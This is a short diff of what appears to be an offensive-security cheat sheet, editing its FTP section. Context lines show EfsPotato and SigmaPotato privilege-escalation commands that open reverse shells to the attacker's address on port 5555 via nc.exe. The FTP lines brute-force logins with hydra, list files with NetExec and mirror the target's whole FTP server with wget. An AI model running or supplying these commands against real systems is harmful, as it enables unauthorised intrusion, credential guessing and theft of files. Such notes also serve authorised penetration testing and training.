@@ -285,9 +285,10 @@ C:\programdata\tmp\EfsPotato.exe "C:\programdata\tmp\nc.exe $MYIP 5555 -e cmd"
 C:\programdata\tmp\SigmaPotato.exe --revshell $MYIP 5555
 
 [*] (21) FTP
+wget -m -q --no-parent --cut-dirs=1 --no-directories -P ftp ftp://$TARGET
 hydra -L usernames -P passwords ftp://$TARGET -t35
+nxc ftp "$TARGET" -u '$USERNAME' -p '$PASSWORD' --ls
 
-nxc ftp "$TARGET" --port 21 -u '$USERNAME' -p '$PASSWORD' --ls
 ftp '$USERNAME'@"$TARGET"
 anonymous
 ls -a
